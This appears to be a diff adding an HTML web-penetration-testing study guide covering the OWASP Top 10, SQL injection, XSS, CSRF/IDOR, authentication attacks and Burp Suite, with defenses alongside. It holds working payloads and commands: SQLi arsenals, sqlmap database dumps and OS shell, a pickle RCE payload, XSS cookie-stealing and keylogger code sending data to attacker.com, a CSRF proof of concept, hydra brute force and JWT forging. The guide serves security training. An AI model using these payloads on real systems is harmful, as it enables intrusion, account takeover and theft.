+    <span class="k">if</span> r.status_code == <span class="v">200</span> <span class="k">and</span> <span class="s">"email"</span> <span class="k">in</span> r.text:
+        <span class="f">print</span>(<span class="s">f"IDOR! User {uid}: {r.json().get('email')}"</span>)
+
+<span class="c"># ── Privilege Escalation Test ─────────────────────</span>
+<span class="c"># Log in as normal user, try admin endpoints</span>
+admin_endpoints = [<span class="s">'/admin'</span>, <span class="s">'/admin/users'</span>, <span class="s">'/api/admin/settings'</span>]
+<span class="k">for</span> ep <span class="k">in</span> admin_endpoints:
+    r = session.get(<span class="s">f"https://target.com{ep}"</span>)
+    <span class="f">print</span>(<span class="s">f"{ep}: {r.status_code}"</span>)  <span class="c"># 200 = vulnerability!</span></pre>
+        </div>
+        <div class="note ng">
+          <div class="note-lbl">Defense</div>
+          Deny access by default. Implement server-side access control — never trust client-supplied IDs alone. Use indirect references (map user→resources server-side). Log and alert on access control failures.
+        </div>
+      </div>
+    </div>
+
+    <!-- A02 -->
+    <div class="owasp-card risk-critical" id="owasp-a02">
+      <div class="oc-header" onclick="tog('owasp-a02')">
+        <div class="oc-num">A02</div>
+        <div class="oc-name-wrap"><div class="oc-name">CRYPTOGRAPHIC FAILURES</div><div class="oc-tagline">Data exposed in transit or at rest — weak/missing encryption</div></div>
+        <div class="oc-meta"><span class="oc-badge badge-crit">Critical</span><span class="oc-chev">▾</span></div>
+      </div>
+      <div class="oc-body">
+        <div class="g2">
+          <div>
+            <p><strong>What to look for:</strong></p>
+            <ul>
+              <li>HTTP instead of HTTPS</li>
+              <li>Weak TLS versions (TLS 1.0/1.1, SSL)</li>
+              <li>Passwords stored as MD5/SHA-1</li>
+              <li>Sensitive data in URL parameters</li>
+              <li>Hardcoded secrets in source code / git history</li>
+              <li>Weak random number generation</li>
+              <li>Missing Secure flag on cookies</li>
+            </ul>
+          </div>
+          <div>
+            <div class="code">
+              <div class="code-bar"><div class="code-title">checking for crypto failures</div><div class="cb-right"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+              <pre><span class="c"># Test TLS configuration</span>
+testssl.sh target.com
+nmap <span class="v">--script ssl-enum-ciphers -p 443</span> target.com
+
+<span class="c"># Check security headers</span>
+curl <span class="v">-sI</span> https://target.com | grep -iE \
+  <span class="s">"strict|secure|httponly|samesite"</span>
+
+<span class="c"># Search git history for secrets</span>
+git log <span class="v">-p</span> | grep <span class="v">-iE</span> <span class="s">"password|api_key|secret|token"</span>
+
+<span class="c"># Look for secrets in JS files</span>
+curl https://target.com/app.js | grep <span class="v">-iE</span> \
+  <span class="s">"apiKey|password|secret|token"</span></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- A03 -->
+    <div class="owasp-card risk-critical" id="owasp-a03">
+      <div class="oc-header" onclick="tog('owasp-a03')">
+        <div class="oc-num">A03</div>
+        <div class="oc-name-wrap"><div class="oc-name">INJECTION</div><div class="oc-tagline">SQLi, OS command injection, LDAP, NoSQL, template injection</div></div>
+        <div class="oc-meta"><span class="oc-badge badge-crit">Critical</span><span class="oc-chev">▾</span></div>
+      </div>
+      <div class="oc-body">
+        <p>Injection occurs when untrusted data is sent to an interpreter as part of a command or query. SQL injection is the most prevalent and dangerous form. Covered in depth in Section 03.</p>
+      </div>
+    </div>
+
+    <!-- A04 -->
+    <div class="owasp-card risk-high" id="owasp-a04">
+      <div class="oc-header" onclick="tog('owasp-a04')">
+        <div class="oc-num">A04</div>
+        <div class="oc-name-wrap"><div class="oc-name">INSECURE DESIGN</div><div class="oc-tagline">Missing or ineffective control design — new in 2021</div></div>
+        <div class="oc-meta"><span class="oc-badge badge-high">High</span><span class="oc-chev">▾</span></div>
+      </div>
+      <div class="oc-body">
+        <p>Design flaws that cannot be fixed by perfect implementation. Examples: no rate limiting on login → brute force possible. No email verification → account enumeration. Business logic that allows negative quantities → free goods.</p>
+        <div class="note nr"><div class="note-lbl">Example</div>A cinema allows booking up to 15 seats. Attacker scripts booking/cancelling all seats → no one else can book → competitor sabotage. Not a bug — it's a design flaw.</div>
+      </div>
+    </div>
+
+    <!-- A05 -->
+    <div class="owasp-card risk-high" id="owasp-a05">
+      <div class="oc-header" onclick="tog('owasp-a05')">
+        <div class="oc-num">A05</div>
+        <div class="oc-name-wrap"><div class="oc-name">SECURITY MISCONFIGURATION</div><div class="oc-tagline">Default creds, verbose errors, exposed admin panels, unnecessary services</div></div>
+        <div class="oc-meta"><span class="oc-badge badge-high">High</span><span class="oc-chev">▾</span></div>
+      </div>
+      <div class="oc-body">
+        <div class="code">
+          <div class="code-bar"><div class="code-title">misconfiguration checks</div><div class="cb-right"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+          <pre><span class="c"># Directory listing enabled?</span>
+curl https://target.com/images/
+
+<span class="c"># Default admin credentials</span>
+curl <span class="v">-u admin:admin</span> https://target.com/admin
+curl <span class="v">-u admin:password</span> https://target.com/admin
+
+<span class="c"># Debug info exposed?</span>
+curl https://target.com/phpinfo.php
+curl https://target.com/.env          <span class="c"># Laravel env file!</span>
+curl https://target.com/config.php.bak
+
+<span class="c"># Exposed git repo</span>
+curl https://target.com/.git/config
+git clone https://target.com/.git/ ./recovered
+
+<span class="c"># gobuster — directory brute force</span>
+gobuster dir <span class="v">-u</span> https://target.com <span class="v">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ffuf <span class="v">-u</span> https://target.com/FUZZ <span class="v">-w</span> wordlist.txt <span class="v">-mc</span> 200,301,302,401</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- A06 -->
+    <div class="owasp-card risk-high" id="owasp-a06">
+      <div class="oc-header" onclick="tog('owasp-a06')">
+        <div class="oc-num">A06</div>
+        <div class="oc-name-wrap"><div class="oc-name">VULNERABLE & OUTDATED COMPONENTS</div><div class="oc-tagline">Log4Shell, Heartbleed, Struts — unpatched dependencies</div></div>
+        <div class="oc-meta"><span class="oc-badge badge-high">High</span><span class="oc-chev">▾</span></div>
+      </div>
+      <div class="oc-body">
+        <div class="code">
+          <div class="code-bar"><div class="code-title">component vulnerability scanning</div><div class="cb-right"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+          <pre><span class="c"># Identify server tech from headers</span>
+curl <span class="v">-sI</span> https://target.com | grep <span class="v">-iE</span> <span class="s">"Server:|X-Powered-By:"</span>
+
+<span class="c"># Nikto — web server scanner</span>
+nikto <span class="v">-h</span> https://target.com
+
+<span class="c"># Check JavaScript libraries</span>
+<span class="c"># Look for: jQuery 1.x, Angular 1.x, React older versions</span>
+curl https://target.com | grep <span class="v">-oE</span> <span class="s">"(jquery|angular|react|bootstrap)[/-][0-9.]+"</span>
+
+<span class="c"># Audit npm/pip/maven dependencies</span>
+npm audit
+pip-audit
+mvn org.owasp:dependency-check-maven:check</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- A07 -->
+    <div class="owasp-card risk-high" id="owasp-a07">
+      <div class="oc-header" onclick="tog('owasp-a07')">
+        <div class="oc-num">A07</div>
+        <div class="oc-name-wrap"><div class="oc-name">IDENTIFICATION & AUTHENTICATION FAILURES</div><div class="oc-tagline">Broken session management, weak passwords, no MFA</div></div>
+        <div class="oc-meta"><span class="oc-badge badge-high">High</span><span class="oc-chev">▾</span></div>
+      </div>
+      <div class="oc-body">
+        <p>Covered in depth in Section 06 — Authentication Attacks.</p>
+      </div>
+    </div>
+
+    <!-- A08 -->
+    <div class="owasp-card risk-medium" id="owasp-a08">
+      <div class="oc-header" onclick="tog('owasp-a08')">
+        <div class="oc-num">A08</div>
+        <div class="oc-name-wrap"><div class="oc-name">SOFTWARE & DATA INTEGRITY FAILURES</div><div class="oc-tagline">Insecure deserialization, supply chain attacks, unsigned updates</div></div>
+        <div class="oc-meta"><span class="oc-badge badge-med">Medium</span><span class="oc-chev">▾</span></div>
+      </div>
+      <div class="oc-body">
+        <p>Relates to code and infrastructure that does not protect against integrity violations. Includes insecure deserialization (Java, PHP, Python pickle) and CI/CD pipeline attacks.</p>
+        <div class="payload"><span class="pl-label">// PHP Object Injection</span>O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}
+
+<span class="pl-label">// Python pickle RCE payload</span>
+import pickle, os
+class Evil:
+    def __reduce__(self):
+        return (os.system, ('id',))
+payload = pickle.dumps(Evil())  # Deserializing this = RCE</div>
+      </div>
+    </div>
+
+    <!-- A09 -->
+    <div class="owasp-card risk-medium" id="owasp-a09">
+      <div class="oc-header" onclick="tog('owasp-a09')">
+        <div class="oc-num">A09</div>
+        <div class="oc-name-wrap"><div class="oc-name">SECURITY LOGGING & MONITORING FAILURES</div><div class="oc-tagline">No audit trail — attackers operate undetected</div></div>
+        <div class="oc-meta"><span class="oc-badge badge-med">Medium</span><span class="oc-chev">▾</span></div>
+      </div>
+      <div class="oc-body">
+        <p>Without logging, attacks go undetected. Log: all auth events, access control failures, server-side input validation failures. Monitor for: brute force patterns, privilege escalation, unusual data access volumes.</p>
+        <div class="note ny"><div class="note-lbl">Avg Detection Time</div>The average time to detect a breach is 197 days. Proper logging and monitoring cuts this dramatically — this is why SOC teams exist.</div>
+      </div>
+    </div>
+
+    <!-- A10 -->
+    <div class="owasp-card risk-medium" id="owasp-a10">
+      <div class="oc-header" onclick="tog('owasp-a10')">
+        <div class="oc-num">A10</div>
+        <div class="oc-name-wrap"><div class="oc-name">SERVER-SIDE REQUEST FORGERY</div><div class="oc-tagline">Force server to make requests to internal services — new in 2021</div></div>
+        <div class="oc-meta"><span class="oc-badge badge-med">Medium</span><span class="oc-chev">▾</span></div>
+      </div>
+      <div class="oc-body">
+        <p>Covered in depth in Section 08 — SSRF & XXE.</p>
+      </div>
+    </div>
+
+  </div><!-- /owasp-grid -->
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S3 · SQL INJECTION
+══════════════════════════════════════════════════ -->
+<section class="section" id="s3">
+  <div class="sec-kicker"><div class="sec-num">03</div><div class="sec-tag">OWASP A03</div></div>
+  <div class="sec-title">SQL Injection</div>
+  <p class="sec-deck">The most devastating web vulnerability — allows reading, modifying, and deleting database contents, and often leads to complete server compromise.</p>
+
+  <div class="diagram"><span class="dh">HOW SQL INJECTION WORKS</span>
+
+<span class="dd">Vulnerable application builds query like this:</span>
+<span class="db">query = "SELECT * FROM users WHERE username='" + user_input + "'"</span>
+
+<span class="dd">Normal input:  username = "alice"</span>
+<span class="dg">→ SELECT * FROM users WHERE username='alice'    ← safe</span>
+
+<span class="dd">Malicious input: username = "' OR '1'='1"</span>
+<span class="dr">→ SELECT * FROM users WHERE username='' OR '1'='1'</span>
+<span class="dr">   ↑ always true — returns ALL users, bypasses login!</span>
+
+<span class="dd">Even worse: username = "admin'--"</span>
+<span class="dr">→ SELECT * FROM users WHERE username='admin'--'</span>
+<span class="dr">   ↑ -- comments out rest → login as admin, no password check!</span></div>
+
+  <div class="tag-row"><span class="tpill">error-based</span><span class="tpill">boolean-based blind</span><span class="tpill">time-based blind</span><span class="tpill">union-based</span><span class="tpill">out-of-band</span></div>
+
+  <div class="g2">
+    <div>
+      <h3 style="font-family:var(--display);font-size:16px;letter-spacing:.06em;color:var(--ink);margin-bottom:14px;text-transform:uppercase">PAYLOAD ARSENAL</h3>
+      <div class="payload"><span class="pl-label">// Detection — does it react?</span>'
+''
+`
+')
+"))
+';--
+'/*
+
+<span class="pl-label">// Auth Bypass</span>
+' OR '1'='1
+' OR 1=1--
+admin'--
+' OR 'x'='x
+
+<span class="pl-label">// UNION-based (find column count first)</span>
+' ORDER BY 1--   ' ORDER BY 2--   ' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+<span class="pl-label">// UNION extract data (MySQL)</span>
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+<span class="pl-label">// Blind Boolean-based</span>
+' AND 1=1--   (true → normal response)
+' AND 1=2--   (false → different/empty response)
+' AND SUBSTRING(username,1,1)='a'--
+
+<span class="pl-label">// Time-based Blind (MySQL)</span>
+'; IF(1=1, SLEEP(5), 0)--
+' AND SLEEP(5)--
+
+<span class="pl-label">// Error-based (MySQL)</span>
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--</div>
+    </div>
+    <div>
+      <div class="code">
+        <div class="code-bar"><div class="code-title">SQLMap — automated SQLi</div><div class="cb-right"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># Basic URL parameter test</span>
+sqlmap <span class="v">-u</span> <span class="s">"https://target.com/item?id=1"</span>
+
+<span class="c"># POST form test</span>
+sqlmap <span class="v">-u</span> <span class="s">"https://target.com/login"</span> \
+       <span class="v">--data</span> <span class="s">"username=admin&password=x"</span>
+
+<span class="c"># With session cookie</span>
+sqlmap <span class="v">-u</span> <span class="s">"https://target.com/profile"</span> \
+       <span class="v">--cookie</span> <span class="s">"session=YOURSESSION"</span>
+
+<span class="c"># Dump the entire database</span>
+sqlmap <span class="v">-u</span> <span class="s">"url?id=1"</span> <span class="v">--dump-all</span>
+
+<span class="c"># Enumerate databases</span>
+sqlmap <span class="v">-u</span> <span class="s">"url?id=1"</span> <span class="v">--dbs</span>
+sqlmap <span class="v">-u</span> <span class="s">"url?id=1"</span> <span class="v">-D myapp --tables</span>
+sqlmap <span class="v">-u</span> <span class="s">"url?id=1"</span> <span class="v">-D myapp -T users --columns</span>
+sqlmap <span class="v">-u</span> <span class="s">"url?id=1"</span> <span class="v">-D myapp -T users --dump</span>
+
+<span class="c"># Aggressive — try all techniques</span>
+sqlmap <span class="v">-u</span> <span class="s">"url?id=1"</span> <span class="v">--level=5 --risk=3</span>
+
+<span class="c"># OS command execution (if DBA user)</span>
+sqlmap <span class="v">-u</span> <span class="s">"url?id=1"</span> <span class="v">--os-shell</span></pre>
+      </div>
+      <div class="code" style="margin-top:12px">
+        <div class="code-bar"><div class="code-title">defense — parameterized queries</div><div class="cb-right"><span class="code-lang">python</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ✗ VULNERABLE — string concatenation</span>
+query = <span class="s">f"SELECT * FROM users WHERE id = {user_id}"</span>
+
+<span class="c"># ✓ SAFE — parameterized query</span>
+query = <span class="s">"SELECT * FROM users WHERE id = %s"</span>
+cursor.execute(query, (user_id,))
+
+<span class="c"># ✓ SAFE — SQLAlchemy ORM</span>
+user = User.query.filter_by(id=user_id).first()</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S4 · XSS
+══════════════════════════════════════════════════ -->
+<section class="section" id="s4">
+  <div class="sec-kicker"><div class="sec-num">04</div><div class="sec-tag">OWASP A03</div></div>
+  <div class="sec-title">XSS — Cross-Site Scripting</div>
+  <p class="sec-deck">Injecting malicious scripts into web pages viewed by other users. Used to steal cookies, hijack sessions, redirect users, and perform actions on their behalf.</p>
+
+  <div class="g3">
+    <div class="mini">
+      <h4>Reflected XSS</h4>
+      <p>Payload in the HTTP request is reflected in the response. User must click a crafted link. Not stored — hits one victim at a time.</p>
+      <p style="font-family:var(--mono);font-size:10px;color:var(--crimson);margin-top:8px">?search=&lt;script&gt;alert(1)&lt;/script&gt;</p>
+    </div>
+    <div class="mini">
+      <h4>Stored XSS</h4>
+      <p>Payload persisted in database (comments, usernames, profiles). Every user who views the page executes the script. Most dangerous type.</p>
+      <p style="font-family:var(--mono);font-size:10px;color:var(--crimson);margin-top:8px">Comment: &lt;script&gt;stealCookie()&lt;/script&gt;</p>
+    </div>
+    <div class="mini">
+      <h4>DOM-Based XSS</h4>
+      <p>Payload processed entirely by JavaScript in the browser. Never hits the server. Hard to detect with server-side WAFs.</p>
+      <p style="font-family:var(--mono);font-size:10px;color:var(--crimson);margin-top:8px">#&lt;img src=x onerror=alert(1)&gt;</p>
+    </div>
+  </div>
+
+  <div class="g2" style="margin-top:18px">
+    <div>
+      <div class="payload"><span class="pl-label">// Basic Detection</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+'&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;/tag&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+javascript:alert(1)
+
+<span class="pl-label">// Cookie Stealing Payload</span>
+&lt;script&gt;
+fetch('https://attacker.com/steal?c=' + document.cookie)
+&lt;/script&gt;
+
+&lt;img src=x onerror="
+  new Image().src='https://attacker.com/?c='+encodeURIComponent(document.cookie)
+"&gt;
+
+<span class="pl-label">// Keylogger</span>
+&lt;script&gt;
+document.onkeypress=function(e){
+  fetch('https://attacker.com/log?k='+e.key)
+}
+&lt;/script&gt;
+
+<span class="pl-label">// Filter Bypass Attempts</span>
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;   ← case variation
+&lt;scr&lt;script&gt;ipt&gt;alert(1)    ← nested tags
+&lt;svg/onload=alert(1)&gt;        ← no space
+&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;</div>
+    </div>
+    <div>
+      <div class="code">
+        <div class="code-bar"><div class="code-title">defense — output encoding</div><div class="cb-right"><span class="code-lang">python / js</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ✗ VULNERABLE — direct output</span>
+<span class="k">return</span> <span class="s">f"&lt;p&gt;Hello {username}&lt;/p&gt;"</span>
+
+<span class="c"># ✓ SAFE — HTML encode output (Python/Jinja2)</span>
+<span class="k">from</span> markupsafe <span class="k">import</span> escape
+<span class="k">return</span> <span class="s">f"&lt;p&gt;Hello {escape(username)}&lt;/p&gt;"</span>
+
+<span class="c"># ✓ SAFE — React (JSX auto-escapes)</span>
+<span class="k">return</span> &lt;p&gt;Hello {username}&lt;/p&gt;  <span class="c">// safe by default</span>
+<span class="c">// NEVER: dangerouslySetInnerHTML = {{ __html: userInput }}</span>
+
+<span class="c"># ✓ Content Security Policy header</span>
+<span class="c"># Prevents execution of inline scripts</span>
+Content-Security-Policy: default-src 'self';
+  script-src 'self' 'nonce-RANDOM123';
+  style-src 'self';
+
+<span class="c"># ✓ HttpOnly Cookie flag</span>
+<span class="c"># Prevents JavaScript reading the cookie</span>
+Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
+
+<span class="c"># Test your CSP at: csp-evaluator.withgoogle.com</span></pre>
+      </div>
+      <div class="note ng" style="margin-top:12px">
+        <div class="note-lbl">Impact Chain</div>
+        XSS → steal session cookie → replay cookie → account takeover. If session cookie has HttpOnly flag, XSS can still perform actions AS the user (CSRF-like), change their email/password, extract CSRF tokens.
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S5 · CSRF & IDOR
+══════════════════════════════════════════════════ -->
+<section class="section" id="s5">
+  <div class="sec-kicker"><div class="sec-num">05</div><div class="sec-tag">Client-Side Attacks</div></div>
+  <div class="sec-title">CSRF & IDOR</div>
+  <p class="sec-deck">Cross-Site Request Forgery forces authenticated users to perform unintended actions. Insecure Direct Object Reference exposes internal object identifiers.</p>
+
+  <div class="g2">
+    <div>
+      <h3 style="font-family:var(--display);font-size:16px;letter-spacing:.06em;color:var(--ink);text-transform:uppercase;margin-bottom:12px">CSRF — Cross-Site Request Forgery</h3>
+      <div class="diagram"><span class="dh">CSRF ATTACK FLOW</span>
+
+1. User logs into bank.com → session cookie set
+2. User visits <span class="dr">evil.com</span> (attacker's page)
+3. evil.com loads hidden form:
+   <span class="dr">&lt;form action="https://bank.com/transfer" method="POST"&gt;</span>
+   <span class="dr">  &lt;input name="to" value="attacker_account"&gt;</span>
+   <span class="dr">  &lt;input name="amount" value="10000"&gt;</span>
+   <span class="dr">&lt;/form&gt;</span>
+   <span class="dr">&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</span>
+4. Browser sends POST to bank.com WITH session cookie
+5. Bank.com processes transfer — user's money gone!</div>
+      <div class="payload"><span class="pl-label">// CSRF PoC HTML template</span>
+&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+&lt;form method="POST" action="https://target.com/change-email"&gt;
+  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+<span class="pl-label">// GET-based CSRF (even simpler)</span>
+&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;</div>
+    </div>
+    <div>
+      <div class="code">
+        <div class="code-bar"><div class="code-title">CSRF defense</div><div class="cb-right"><span class="code-lang">python</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># ✓ CSRF Token (server generates, validates)</span>
+<span class="c"># Every form gets a unique, unpredictable token</span>
+<span class="k">import</span> secrets
+csrf_token = secrets.token_hex(<span class="v">32</span>)
+session[<span class="s">'csrf_token'</span>] = csrf_token
+
+<span class="c"># In form:</span>
+<span class="c"># &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;</span>
+
+<span class="c"># On form submit — verify token matches</span>
+<span class="k">if</span> request.form[<span class="s">'csrf_token'</span>] != session[<span class="s">'csrf_token'</span>]:
+    <span class="k">return</span> <span class="s">"CSRF detected!"</span>, <span class="v">403</span>
+
+<span class="c"># ✓ SameSite Cookie attribute</span>
+Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
+<span class="c"># Strict: cookie never sent cross-site (breaks some flows)</span>
+<span class="c"># Lax:    sent for top-level navigation GETs only</span>
+
+<span class="c"># ✓ Check Origin / Referer header (extra layer)</span>
+<span class="k">if</span> request.headers.get(<span class="s">'Origin'</span>) != <span class="s">'https://yoursite.com'</span>:
+    abort(<span class="v">403</span>)</pre>
+      </div>
+
+      <h3 style="font-family:var(--display);font-size:16px;letter-spacing:.06em;color:var(--ink);text-transform:uppercase;margin:18px 0 12px">IDOR — Testing Methodology</h3>
+      <div class="code">
+        <div class="code-bar"><div class="code-title">IDOR testing with Burp</div><div class="cb-right"><span class="code-lang">methodology</span></div></div>
+        <pre><span class="c"># 1. Find ID parameters in requests</span>
+<span class="c">#    /api/user/1234/orders</span>
+<span class="c">#    /download?file_id=567</span>
+<span class="c">#    {"user_id": 789}</span>
+
+<span class="c"># 2. Create two accounts (A and B)</span>
+<span class="c"># 3. Logged in as A, access B's resources by ID</span>
+<span class="c"># 4. Try: numeric++, UUID swap, base64 decode/change</span>
+
+<span class="c"># Burp: Intruder → Sniper → ID parameter</span>
+<span class="c"># Payload: number range 1-1000</span>
+<span class="c"># Grep → Extract → email/name from response</span>
+<span class="c"># Filter: status code 200 ≠ "not found"</span>
+
+<span class="c"># Also try indirect references:</span>
+<span class="c"># /api/my-orders → returns YOUR orders</span>
+<span class="c"># Change: /api/other-user-orders (if endpoint guessable)</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S6 · AUTHENTICATION ATTACKS
+══════════════════════════════════════════════════ -->
+<section class="section" id="s6">
+  <div class="sec-kicker"><div class="sec-num">06</div><div class="sec-tag">OWASP A07</div></div>
+  <div class="sec-title">Authentication Attacks</div>
+  <p class="sec-deck">Broken authentication — session fixation, credential stuffing, brute force, password reset flaws, JWT attacks.</p>
+
+  <div class="g2">
+    <div>
+      <div class="code">
+        <div class="code-bar"><div class="code-title">brute force with hydra</div><div class="cb-right"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># HTTP POST form brute force</span>
+hydra <span class="v">-l admin -P</span> /usr/share/wordlists/rockyou.txt \
+  target.com http-post-form \
+  <span class="s">"/login:username=^USER^&password=^PASS^:F=Invalid"</span>
+
+<span class="c"># SSH brute force</span>
+hydra <span class="v">-l root -P</span> rockyou.txt ssh://target.com
+
+<span class="c"># HTTP Basic Auth</span>
+hydra <span class="v">-l admin -P</span> rockyou.txt target.com http-get /admin
+
+<span class="c"># Rate limit bypass techniques:</span>
+<span class="c"># - X-Forwarded-For: rotate IPs</span>
+<span class="c"># - X-Originating-IP: change each request</span>
+<span class="c"># - Slow down: add delays between attempts</span>
+<span class="c"># - Username enumeration: different errors for</span>
+<span class="c">#   valid vs invalid usernames</span></pre>
+      </div>
+
+      <div class="code" style="margin-top:12px">
+        <div class="code-bar"><div class="code-title">JWT attacks</div><div class="cb-right"><span class="code-lang">python</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="k">import</span> jwt, base64, json
+
+token = <span class="s">"eyJhbGci..."</span>
+<span class="c"># Decode JWT (no verification)</span>
+parts = token.split(<span class="s">'.'</span>)
+header  = json.loads(base64.b64decode(parts[<span class="v">0</span>] + <span class="s">'=='</span>))
+payload = json.loads(base64.b64decode(parts[<span class="v">1</span>] + <span class="s">'=='</span>))
+<span class="f">print</span>(header)   <span class="c"># {"alg":"HS256","typ":"JWT"}</span>
+<span class="f">print</span>(payload)  <span class="c"># {"user":"rudra","role":"user"}</span>
+
+<span class="c"># Attack 1: alg=none (remove signature)</span>
+fake_header = base64.b64encode(
+    <span class="s">b'{"alg":"none","typ":"JWT"}'</span>).decode().rstrip(<span class="s">'='</span>)
+fake_payload = base64.b64encode(
+    <span class="s">b'{"user":"admin","role":"admin"}'</span>).decode().rstrip(<span class="s">'='</span>)
+forged = <span class="s">f"{fake_header}.{fake_payload}."</span>
+
+<span class="c"># Attack 2: HS256 weak secret brute force</span>
+<span class="c"># hashcat -a 0 -m 16500 jwt.txt rockyou.txt</span>
+
+<span class="c"># Attack 3: RS256 → HS256 confusion</span>
+<span class="c"># Sign with server's public key using HS256</span>
+<span class="c"># Server verifies HMAC using "public key" as HMAC key</span></pre>
+      </div>
+    </div>
+    <div>
+      <div class="mini">
+        <h4>Password Reset Vulnerabilities</h4>
+        <ul>
+          <li><strong>Predictable tokens</strong> — sequential or time-based reset tokens</li>
+          <li><strong>Long expiry</strong> — tokens valid for days</li>
+          <li><strong>No single-use</strong> — token works multiple times</li>
+          <li><strong>Host header injection</strong> — poison reset link with attacker domain</li>
+          <li><strong>Username enumeration</strong> — different responses for valid/invalid users</li>
+        </ul>
+      </div>
+      <div class="payload" style="margin-top:12px"><span class="pl-label">// Host Header Injection → Password Reset Poisoning</span>
+POST /reset-password HTTP/1.1
+Host: attacker.com          ← attacker changes this
+X-Forwarded-Host: evil.com  ← or this
+
+Body: email=victim@target.com
+
+→ Server sends reset email with link:
+  https://attacker.com/reset?token=SECRET_TOKEN
+→ Victim clicks link → attacker's server logs token!
+
+<span class="pl-label">// Session Fixation</span>
+1. Attacker visits login page → gets sessionID=KNOWN
+2. Tricks victim into using ?sessionid=KNOWN
+3. Victim logs in → their session = KNOWN
+4. Attacker uses KNOWN session → account takeover!</div>
+      <div class="note ng" style="margin-top:12px">
+        <div class="note-lbl">Defense Checklist</div>
+        Use long random tokens (32+ bytes). Single-use — invalidate after use. Short expiry (15-60 min). Rate limit login + reset. Lock account after N failures. MFA. Never leak valid usernames in error messages.
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S7 · BURP SUITE
+══════════════════════════════════════════════════ -->
+<section class="section" id="s7">
+  <div class="sec-kicker"><div class="sec-num">07</div><div class="sec-tag">Primary Tool</div></div>
+  <div class="sec-title">Burp Suite Workflow</div>
+  <p class="sec-deck">The essential web application security testing platform. Every professional web pentester lives in Burp Suite.</p>
+
+  <div class="atk-flow">
+    <div class="af-step">Proxy<br>Intercept</div><div class="af-arr">→</div>
+    <div class="af-step">Spider /<br>Crawler</div><div class="af-arr">→</div>
+    <div class="af-step red">Scanner<br>(Active)</div><div class="af-arr">→</div>
+    <div class="af-step orange">Repeater<br>Manual</div><div class="af-arr">→</div>
+    <div class="af-step orange">Intruder<br>Fuzzing</div><div class="af-arr">→</div>
+    <div class="af-step green">Report<br>Findings</div>
+  </div>
+
+  <div class="g2" style="margin-top:18px">
+    <div>
+      <table class="dt">
+        <tr><th>Tool</th><th>Purpose</th><th>Key Use</th></tr>
+        <tr><td><strong>Proxy</strong></td><td>Intercept & modify HTTP/S</td><td>See every request</td></tr>
+        <tr><td><strong>Repeater</strong></td><td>Manually resend & modify requests</td><td>Manual SQLi / XSS testing</td></tr>
+        <tr><td><strong>Intruder</strong></td><td>Automated fuzzing / brute force</td><td>Password brute force, IDOR</td></tr>
+        <tr><td><strong>Scanner</strong></td><td>Auto-detect vulns (Pro only)</td><td>Coverage scanning</td></tr>
+        <tr><td><strong>Decoder</strong></td><td>Encode/decode data</td><td>Base64, URL, HTML entities</td></tr>
+        <tr><td><strong>Comparer</strong></td><td>Diff two responses</td><td>Blind injection detection</td></tr>
+        <tr><td><strong>Collaborator</strong></td><td>Out-of-band interaction detection</td><td>Blind SSRF, XXE, SQLi</td></tr>
+      </table>
+    </div>
+    <div>
+      <div class="code">
+        <div class="code-bar"><div class="code-title">Burp setup & usage tips</div><div class="cb-right"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># Route browser through Burp</span>
+<span class="c"># Firefox: Preferences → Network → Manual Proxy</span>
+<span class="c"># Host: 127.0.0.1  Port: 8080</span>
+
+<span class="c"># Install Burp CA certificate</span>
+<span class="c"># Navigate to http://burpsuite → Download cert</span>
+<span class="c"># Firefox → Certificates → Import → Trust for HTTPS</span>
+
+<span class="c"># Route curl through Burp</span>
+curl <span class="v">--proxy http://127.0.0.1:8080</span> <span class="v">-k</span> https://target.com
+
